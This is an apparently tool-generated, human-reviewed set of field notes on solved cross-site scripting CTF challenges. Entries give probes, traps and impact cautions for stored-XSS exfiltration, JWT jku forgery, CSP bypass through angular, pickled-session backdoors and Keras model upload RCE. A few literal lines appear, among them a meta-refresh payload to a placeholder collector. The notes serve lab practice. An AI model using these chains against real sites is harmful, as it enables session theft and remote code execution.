# Field notes — Cross-site scripting

Written by `tools/classify_solve.py` after a flag is verified, then reviewed by a
human. Nothing here is generated from guesswork: every entry cites the solved note
and the chain card it came from.

| Status | Meaning |
|---|---|
| `proposed` | written automatically after a solve; not yet reviewed |
| `confirmed` | a human checked it against the evidence and kept it |

Promote an entry by changing its status line to `confirmed`. Delete an entry that
did not hold up, and say why in the commit message. `test/regression.py` fails if
an entry has any other status.

---

## 2026-09-18 · xss (Full Stack Conf) · proposed

- source note: `solved/htb-fullstackconf-stored-xss-innerhtml-socketio-flag.md`
- chain card: `knowledge/chains/htb-fullstackconf-blind-stored-xss-socketio-oracle.json`
- verification: verified_live — the flag arrived inside an event frame pushed by the live target on its own push channel, in response to a stored payload executing in the renderer
- classified as: `web-xss` (score 2.5, 2 signals matched)
- also matched: `web-race-condition` (1.5), `web-ssrf` (1.5), `web-sqli` (1.5)
- signals that fired: innerHTML, xss

**Confirming probe that worked**

> open the push channel, leave it idle briefly to confirm it stays silent, then submit an image element with an error handler as the stored value and keep the channel open for about two minutes

Expected: a frame arrives on the channel carrying the reward payload

Falsifier: the channel delivers unrelated traffic while idle, so silence proves nothing, or repeated submissions across contexts produce no frame at all

**Traps recorded on this solve**

- an element whose handler fires while a plain script element does not is the signature of insertion through an HTML property rather than a parser, so carry the handler-based payload first and do not read a failing script element as the value being escaped
- one silent run is not a negative on a bot-driven target: the first attempt with a payload that was later proven to work saw nothing for ninety seconds, and the difference was never explained, so re-run before discarding a payload
- confirm the channel is one that stays open until the server has data before treating its silence as a result
- a comment declaring the push channel is not part of the challenge is misleading; it is not part of the bug but it is the entire exfiltration path

**Blast radius**: the submission is an ordinary newsletter registration and each payload stores one row that a shared renderer will execute. Keep the payload to a harmless dialog, never a redirect, a request to an outside host, or anything that changes state, because other players' sessions are rendered by the same component. Do not repeat the batch once it has fired.

- status: proposed

## 2026-09-23 · QuickBlog · proposed

- source note: `solved/htb-quickblog-codefence-xss-registration-oracle-pickle-session.md`
- chain card: `knowledge/chains/htb-quickblog-codefence-xss-registration-oracle-pickle-session.json`
- verification: verified_live — GET /admin with the recovered cookie returned 200 containing 'admin page, admin_user.', and after the session-store write GET /uploads/res.txt returned the flag in the response body. After the cleanup run the same path returns 404 and re-sending both planted cookies produces nothing.
- classified as: `web-xss` (score 4.5, 4 signals matched)
- also matched: `web-ssrf` (3.5), `web-file-upload` (2.5), `web-ssti` (2.5)
- signals that fired: XSS, admin bot, innerHTML, unescape

**Confirming probe that worked**

> Store a code fence whose language field closes the attribute and adds autofocus with a tabindex and an onfocus that is a percent-encoded eval(unescape(...)), then load the page yourself in a real browser.

Expected: The handler fires on insertion with no interaction, proving both that the attribute sink is reachable through the incomplete escaping and that the case-folding filter does not stop a reconstituted payload.

Falsifier: The attribute is escaped, or the handler never fires without interaction, meaning the sink is not injectable and the privileged browser cannot be made to run anything.

**Traps recorded on this solve**

- A bot that logs in again on every run has a different session id each time, so a shared exfiltration namespace mixes runs into a value that is not any real id. Lock the namespace to one run.
- The registration oracle WRITES: probing a name creates it, so probing before the privileged visit hands the bot a name it can no longer create and that symbol is lost. Never probe the lock name at all.
- Registration overwrites the session's own username, so the exfiltration requests have to omit credentials or the stolen session is demoted before it can be used.
- A template literal cannot be an object key; `{`Content-Type`: ...}` is a SyntaxError. Percent-encoding already makes ordinary double quotes safe inside the attribute.
- The framework's session loader expects a (data, expiration) tuple. Pickling the bare payload still executes but then raises, which is noisier than pickling the expected shape.
- A single-threaded http.server deadlocks headless Chrome, which opens several connections; local rehearsals need ThreadingHTTPServer.
- The flag name is randomised at container start, so it has to be globbed, and a setuid helper is usually the intended reader.

**Blast radius**: The pickled session file executes as the application user for anyone who sets that cookie, so it is a remote backdoor until removed; make the payload delete it in the same command. The exfiltration registers several hundred throwaway accounts and the stored payload keeps firing on every scheduled visit, both of which live in process memory and only clear on restart. Do not point the injected command at configuration or at imported modules. On a shared instance the registration oracle is several hundred sequential writes: keep concurrency low and never probe a namespace the payload has not written yet, because probing creates the name and destroys that symbol.

- status: proposed

## 2026-09-23 · self-XSS notes app with an offline report bot (noted) · proposed

- source note: `solved/noted.md`
- chain card: `knowledge/chains/pico-noted-internal-origin-named-window-noopener-inband-exfil.json`
- verification: verified_live — the flag arrived as the content of a note in our own account and was read from the live GET /notes response
- classified as: `web-xss` (score 1.5, 1 signals matched)
- also matched: `web-csrf` (2.5), `web-xs-leaks` (2.0), `web-auth-session` (1.5)
- signals that fired: xss

**Confirming probe that worked**

> report a page whose only job is to post a fixed marker back through the application's own write API using the internal address

Expected: the marker appears in your own account, proving the reported page executed and the internal address is correct

Falsifier: no marker appears, meaning the scheme is not executed by the bot or the address is unreachable

**Traps recorded on this solve**

- target=_blank carries implicit noopener, which puts the new window in a SEPARATE browsing-context group so window.open('',name) cannot resolve the name and silently returns a blank window; the symptom is indistinguishable from popup blocking -- use a NAMED target
- a top-level data: URL does not execute when Chrome is given it as a command-line argument but does under the bot's CDP-driven navigation; test the path the bot actually uses
- with no egress, make the payload post its own step-by-step diagnostics back through the app; that converts a silent black box into a debugger

**Blast radius**: each report spawns a browser and a fresh account server-side; keep reports serial. The stored payload runs in your own account only.

- status: proposed

## 2026-09-23 · Why Lambda · proposed

- source note: `solved/why_lambda.md`
- chain card: `knowledge/chains/htb-why-lambda-complaint-vhtml-xss-bot-keras-lambda-h5-upload-rce.json`
- verification: verified_live — POST /api/predict returned the flag as the prediction value on the live target
- classified as: `web-xss` (score 2.5, 2 signals matched)
- also matched: `web-file-upload` (3.5), `web-ssrf` (3.5), `web-ssti` (2.5)
- signals that fired: XSS, v-html

**Confirming probe that worked**

> POST /api/predict with the static CSRF header, before and after a complaint whose prediction field carries the payload

Expected: the value changes from an integer to a string carrying command output

Falsifier: it stays an integer, so one of the render, the fetch or the deserialisation did not happen and each has to be checked on its own

**Traps recorded on this solve**

- a payload built on the wrong interpreter version fails to load and is indistinguishable from a rejected upload
- the code runs while the graph is being built, so the upload route can answer with an error while the exploit has already succeeded
- an HTML-rendering directive does not run a script tag, only an event handler
- the filename check is a substring test, so the extension proves nothing about the content
- the chain has exactly one observable, so every link must be verified offline first

**Blast radius**: the payload runs arbitrary code in the application process and rebinds one of its functions, so choose a function the source itself calls meaningless and restore it afterwards. Each attempt leaves a complaint file and an uploaded model on disk; remove them by an exact marker rather than by wildcard, because the same directory holds content the application generated. Every complaint also starts a headless browser, so keep the attempt count low.

- status: proposed

## 2026-09-24 · BoneChewerCon · proposed

- source note: `solved/htb-bonechewercon-jku-csp-crlf.md`
- chain card: `knowledge/chains/htb-bonechewercon-jku-forge-csp-injection-nginx-crlf-cookie-plant.json`
- verification: verified_live — the bot fetched the attacker JWKS (proving the planted cookie was decoded) and then called back with the rendered admin table containing the flag row and the /list error_path flash
- classified as: `web-xss` (score 4.5, 4 signals matched)
- also matched: `web-auth-session` (3.5), `web-request-smuggling` (3.5), `web-ssrf` (3.5)
- signals that fired: XSS, admin bot, content-security-policy, innerHTML

**Confirming probe that worked**

> set the auth cookie to a JWT whose jku is https://abc@localhost@YOURHOST/jwks.json signed with your own key, then GET / and watch your JWKS host

Expected: 200 on / plus a hit on your jwks.json, and the privileged endpoint's error changing from 'You are not admin' to the next gate - proof the forged identity was accepted

Falsifier: 400 'Invalid provider' (host check not bypassed) or 400 'Invalid exponent and/or modulus' (n/e were not decimal strings)

**Traps recorded on this solve**

- NAME COLLISION: a different HTB challenge, 'baby BoneChewerCon', is nginx/PHP/Laravel/Whoops and is covered by htb-bonechewercon-method-not-allowed-whoops-env-disclosure. Check the stack before reusing either card; chain_match scores signals, not challenge names, so a name query returns nothing and that is correct.
- the IP gate is genuine here: /api/bot/login answers 'Your IP is not allowed' and X-Forwarded-For does not help, so a forged admin token alone reads nothing - the bot must do the reading
- JWKS n and e must be decimal digit strings because of an isdigit() check; base64url values abort with 'Invalid exponent and/or modulus'
- dangling markup absorbs forward only, and every submission renders below the flag row, so no dangling-markup variant reaches the flag; that dead end is what forces the CSP-injection route
- the first render cannot execute the handler - the CSP is still strict at that point; expect the exfil only on the second load, after the cookie swap
- set Path=/list on the planted cookie, otherwise the bot's existing Path=/ cookie may be sent first and the CSP is never poisoned
- a free tunnel that injects a browser-warning interstitial will fail the Content-Type application/json check; verify the JWKS URL with an Accept: */* request before using it

**Blast radius**: shared instance: the payload is a row in a shared presentations table with NO delete endpoint, so it cannot be cleaned up afterwards, and while it is live it redirects the shared admin bot and overwrites its auth cookie. Submit exactly one, expect the bot/app to reset the table periodically (so it may need re-submitting), and never point the meta refresh anywhere but the challenge host.

- status: proposed

## 2026-09-27 · The Galactic Times · confirmed

- source note: `challenges/The Galactic Times/web_the_galactic_times/challenge/views/list.pug`
- chain card: `knowledge/chains/htb-galactic-times-pug-unescaped-stored-xss-cdnjs-angular-csp-bypass-localhost-bot-read.json`
- verification: verified_live — Live HTB instance. A meta-refresh payload produced a request from Mozilla/5.0 (X11; Linux x86_64) ... HeadlessChrome/90.0.4427.0 Safari/537.36, proving the bot, the raw-HTML rendering and the container's egress. A cdnjs angular payload with an 8-second meta-refresh fallback produced the angular marker and never the fallback, proving the CSP bypass. The final payload returned GOT?f=HTB{...} to the collector. Separately, before any of that, the bypass was verified in a browser against the live origin's real CSP header: new Function(...) returned FUNC-OK, the cdnjs script loaded and defined angular, angular.bootstrap on {{constructor.constructor(...)()}} executed, fetch('/alien') reached the app and was refused by it with 401 rather than by CSP, while a cross-origin fetch and a cross-origin image were both blocked.
- classified as: `web-xss` (score 0.0, 0 signals matched)
- also matched: `web-ssrf` (1.4), `web-cache-poisoning` (1.06)
- filed by operator override: the matcher did not rank this class; the chain is filed under the class whose first probe opens it

**Confirming probe that worked**

> submit, as the stored content, exactly: <meta http-equiv="refresh" content="0;url=http://<your collector>/marker">

Expected: a request for /marker arrives at your collector from a headless browser user agent, within seconds of the submission

Falsifier: nothing arrives. Before blaming the payload, re-prove that the collector is reachable from outside at that exact moment -- a dead tunnel and a broken payload look identical from here

**Traps recorded on this solve**

- a dead callback host is indistinguishable from a broken payload, and this is the trap that cost the most here. The free ssh tunnel used carried traffic for roughly a minute after it was established and then silently stopped while the ssh process stayed alive and the public hostname merely timed out. Four payload variants and a length sweep were all wrongly suspected before re-sending a known-good payload showed that IT had stopped arriving too. Prove delivery with a marker request immediately before every submission, and rebuild the tunnel per attempt rather than leaving one up.
- fetch().then(...) in the payload produces no hit AND no error, because the bot's goto resolves on network idle and browser.close() tears the page down before the promise settles. That silence reads exactly like a payload that never ran. Use a synchronous XMLHttpRequest.
- a failed angular expression is silent. Keep the expression string single-quoted with double quotes inside -- the one form proven to work here -- because a backslash-escaped variant parses as nothing and reports nothing. Avoid regexes in the expression too: braces inside {{ }} are an avoidable risk, and indexOf plus substr needs neither braces nor escapes.
- always include a catch that navigates with the error text. Without it every failure mode looks the same from outside.
- `kill "${VAR:-0}"` in a runner script sends the signal to the whole PROCESS GROUP on the first pass, when the variable is still unset, and kills the script itself -- exit 144 after printing one line. This masqueraded as the exploit failing for two runs. Only ever kill a PID that is set and greater than 1.
- the app's own cleanup wipes the stored content after every bot visit, so a payload cannot be staged and triggered later; and a browser that follows redirects will turn the gated page's 401 into something else entirely if you probe it carelessly.
- discovery that was interrupted is not a negative result. The route holding the flag was in the wordlist already in use; the run was cut short by a timeout wrapper after printing two routes, and the partial output was read as the complete list.

**Blast radius**: Every attempt writes a row and launches a browser on the target: the submission endpoint calls the bot synchronously in its handler, so one submission is one Chrome launch. Keep the rate to a few per minute and the attempt count low. The app wipes its own table after each bot visit, so nothing persists and there is nothing to clean up on the target, but that same wipe means a payload left sitting is gone by the next visit -- submit and watch in one go rather than staging. On your own side this needs a public collector: bind it to loopback, expose it only through one tunnel, use it for the single leak, then tear it down and verify the port is refusing connections.

- status: confirmed
